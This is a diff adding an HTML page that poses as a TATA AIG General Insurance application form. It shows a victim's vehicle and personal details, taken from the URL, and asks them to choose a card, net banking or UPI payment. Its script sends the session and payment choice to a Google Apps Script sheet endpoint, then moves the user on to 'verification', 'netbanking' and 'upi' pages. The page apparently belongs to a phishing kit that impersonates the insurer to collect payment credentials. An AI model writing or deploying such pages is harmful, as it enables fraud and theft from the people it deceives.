@@ -1,0 +1,623 @@
+<!DOCTYPE html>
+<html>
+<head>
+<title>Insurance Details</title>
+
+<style>
+
+    *{
+box-sizing:border-box;
+}
+
+body{
+font-family:Poppins,sans-serif;
+background:#f4f7fb;
+padding:50px;
+}
+
+.card{
+max-width:900px;
+margin:auto;
+background:white;
+padding:40px;
+border-radius:20px;
+box-shadow:0 10px 25px rgba(0,0,0,.1);
+}
+
+input{
+width:100%;
+padding:15px;
+margin-top:8px;
+margin-bottom:20px;
+border:1px solid #ddd;
+border-radius:10px;
+}
+
+body{
+font-family:'Poppins',sans-serif;
+background:#eef4fb;
+padding:40px;
+}
+
+.card{
+max-width:900px;
+margin:auto;
+background:white;
+border-radius:20px;
+padding:25px;
+box-shadow:0 10px 25px rgba(0,0,0,.08);
+}
+
+.badge{
+text-align:center;
+color:#ff3d57;
+font-weight:700;
+margin-bottom:15px;
+}
+
+.main-title{
+font-size:36px;
+text-align:center;
+color:#003B8E;
+margin-bottom:15px;
+}
+
+.subtitle{
+text-align:center;
+color:#6b7a99;
+font-size:16px;
+margin-bottom:40px;
+}
+
+.section-title{
+font-size:30px;
+color:#003B8E;
+margin:40px 0 25px;
+}
+
+.grid{
+display:grid;
+grid-template-columns:1fr 1fr;
+gap:15px;
+}
+
+input,
+textarea,
+select{
+
+width:100%;
+padding:18px;
+
+border:1px solid #dfe5ef;
+border-radius:14px;
+
+font-size:16px;
+background:#fff;
+}
+
+label{
+display:block;
+font-weight:600;
+margin-bottom:10px;
+color:#003B8E;
+}
+
+.full{
+grid-column:1/3;
+}
+
+.submit-btn{
+
+width:18%;
+padding:14px;
+
+border:none;
+border-radius:15px;
+
+background:linear-gradient(
+90deg,
+#ff003d,
+#ff4b4b
+);
+
+color:white;
+font-size:22px;
+font-weight:600;
+
+cursor:pointer;
+
+margin-top:35px;
+}
+
+.top-header{
+
+background:white;
+padding:25px 40px;
+
+border-radius:25px;
+
+display:flex;
+justify-content:space-between;
+align-items:center;
+
+margin-bottom:30px;
+
+box-shadow:0 10px 30px rgba(0,0,0,.08);
+
+}
+
+.logo-box{
+
+display:flex;
+align-items:center;
+gap:15px;
+
+}
+
+.logo-circle{
+
+width:65px;
+height:65px;
+
+background:#003B8E;
+color:white;
+
+border-radius:50%;
+
+display:flex;
+justify-content:center;
+align-items:center;
+
+font-size:30px;
+
+}
+
+.logo-box h2{
+
+margin:0;
+font-size:32px;
+color:#003B8E;
+
+}
+
+.logo-box span{
+
+color:#E31837;
+
+}
+
+.logo-box p{
+
+margin:0;
+color:#777;
+
+}
+
+.progress-box{
+
+width:350px;
+
+}
+
+.progress-text{
+
+font-weight:600;
+margin-bottom:10px;
+
+}
+
+.progress-bar{
+
+height:12px;
+background:#ddd;
+
+border-radius:50px;
+
+overflow:hidden;
+
+}
+
+.progress-fill{
+
+width:80%;
+height:100%;
+
+background:linear-gradient(
+90deg,
+#003B8E,
+#2d7dff
+);
+
+}
+
+.card{
+
+position:relative;
+
+}
+
+.card::before{
+
+content:'';
+
+position:absolute;
+
+top:0;
+left:0;
+
+width:100%;
+height:6px;
+
+background:linear-gradient(
+90deg,
+#003B8E,
+#E31837
+);
+
+border-radius:
+30px 30px 0 0;
+
+}
+
+input[readonly],
+textarea[readonly]{
+
+background:#f4f7fb;
+
+font-weight:600;
+
+}
+
+.section-title{
+
+border-left:5px solid #E31837;
+
+padding-left:15px;
+
+}
+
+.payment-grid{
+
+display:grid;
+grid-template-columns:repeat(4,1fr);
+gap:15px;
+
+margin-top:20px;
+margin-bottom:20px;
+
+}
+
+.payment-card{
+
+background:white;
+border:2px solid #dfe5ef;
+border-radius:12px;
+padding:12px;
+text-align:center;
+cursor:pointer;
+transition:.3s;
+
+}
+
+.payment-card:hover{
+
+border-color:#003B8E;
+
+transform:translateY(-4px);
+
+}
+
+.payment-card label{
+
+font-size:22px;
+
+cursor:pointer;
+
+}
+
+.payment-card input{
+
+margin-bottom:15px;
+
+}
+
+.upi-box{
+
+margin-top:40px;
+
+text-align:center;
+
+background:white;
+
+padding:30px;
+
+border-radius:20px;
+
+box-shadow:0 10px 25px rgba(0,0,0,.08);
+
+}
+
+.upi-box img{
+
+width:250px;
+
+margin-top:15px;
+
+}
+
+.upi-box p{
+
+font-size:18px;
+
+font-weight:600;
+
+color:#003B8E;
+
+}
+
+.card{
+max-width:900px !important;
+padding:25px !important;
+}
+
+.main-title{
+font-size:36px !important;
+}
+
+.subtitle{
+font-size:16px !important;
+}
+
+input,
+textarea,
+select{
+padding:10px !important;
+}
+
+.grid{
+gap:15px !important;
+}
+
+.payment-card{
+padding:15px !important;
+}
+
+.submit-btn{
+padding:14px !important;
+font-size:18px !important;
+}
+
+@media(max-width:768px){
+
+.payment-grid{
+
+grid-template-columns:repeat(2,1fr);
+
+}
+
+}
+
+</style>
+
+</head>
+<body>
+
+<div class="top-header">
+
+<div class="logo-box">
+
+<div class="logo-circle">🛡</div>
+
+<div>
+<h2>TATA <span>AIG</span></h2>
+<p>General Insurance</p>
+</div>
+
+</div>
+
+<div class="progress-box">
+
+<div class="progress-text">
+Application Progress : 80%
+</div>
+
+<div class="progress-bar">
+<div class="progress-fill"></div>
+</div>
+
+</div>
+
+</div>
+
+<div class="badge">STEP 2 OF 2</div>
+
+<h1 class="main-title">
+Complete Your Insurance Application
+</h1>
+
+<p class="subtitle">
+Review your details and complete the remaining information.
+</p>
+
+<h2 class="section-title">
+Customer Details
+</h2>
+
+<div class="grid">
+
+<div>
+<label>Vehicle Number</label>
+<input id="vehicleNo" readonly>
+</div>
+
+<div>
+<label>Vehicle Price</label>
+<input id="vehiclePrice" readonly>
+</div>
+
+<div>
+<label>Owner Name</label>
+<input id="ownerName" readonly>
+</div>
+
+<div>
+<label>Mobile Number</label>
+<input id="mobile" readonly>
+</div>
+
+<div class="full">
+<label>Address</label>
+<textarea id="address" readonly rows="4"></textarea>
+</div>
+
+</div>
+
+<hr style="margin:40px 0;">
+
+<hr><br>
+
+<div class="section-title">
+Payment Method
+</div>
+
+<div class="payment-grid">
+
+<div class="payment-card">
+<input type="radio" name="payment" id="credit" value="credit">
+<label for="credit">
+💳 Credit Card
+</label>
+</div>
+
+<div class="payment-card">
+<input type="radio" name="payment" id="debit" value="debit">
+
+<label for="debit">
+🏦 Debit Card
+</label>
+</div>
+
+<div class="payment-card">
+<input type="radio" name="payment" id="netbanking" value="netbanking">
+<label for="netbanking">
+🏛 Net Banking
+</label>
+</div>
+
+<div class="payment-card">
+<input type="radio" name="payment" id="upi" value="upi">
+<label for="upi">
+📱 UPI / QR Code
+</label>
+</div>
+
+</div>
+
+
+
+
+<button
+class="submit-btn"
+onclick="openVerificationForm()">
+Proceed To Payment →
+</button>
+</div>
+
+<script>
+
+    async function saveToSheet(data){
+
+await fetch(
+"https://script.google.com/macros/s/AKfycbwH7ZC3eFeV4B-3Z8B9-LihYgrHqAYEdlx2DFdeWE-i5Wq3XqmrHIlWheoOQKTXtuFpIA/exec",
+{
+method:"POST",
+body:JSON.stringify(data)
+}
+);
+
+}
+
+    async function openVerificationForm(){
+
+let selected =
+document.querySelector(
+'input[name="payment"]:checked'
+);
+
+if(!selected){
+
+alert(
+"Please select a payment method"
+);
+
+return;
+
+}
+
+let sessionId =
+localStorage.getItem("sessionId");
+
+await saveToSheet({
+
+sessionId:sessionId,
+
+paymentMethod:selected.value,
+
+status:"FORM2"
+
+});
+
+if(
+selected.value==="credit" ||
+selected.value==="debit"
+){
+
+window.location.href =
+"verification.html";
+
+}
+
+else if(
+selected.value==="netbanking"
+){
+
+window.location.href =
+"netbanking.html";
+
+}
+
+else if(
+selected.value==="upi"
+){
+
+window.location.href =
+"upi.html";
+
+}
+
+}
+
+const params =
+new URLSearchParams(window.location.search);
+
+document.getElementById("vehicleNo").value =
+params.get("vehicleNo") || "";
+
+document.getElementById("vehiclePrice").value =
+params.get("vehiclePrice") || "";
+
+document.getElementById("ownerName").value =
+params.get("ownerName") || "";
+
+document.getElementById("mobile").value =
+params.get("mobile") || "";
+
+document.getElementById("address").value =
+params.get("address") || "";
+
+
+
+</script>
+
+</body>
+</html>
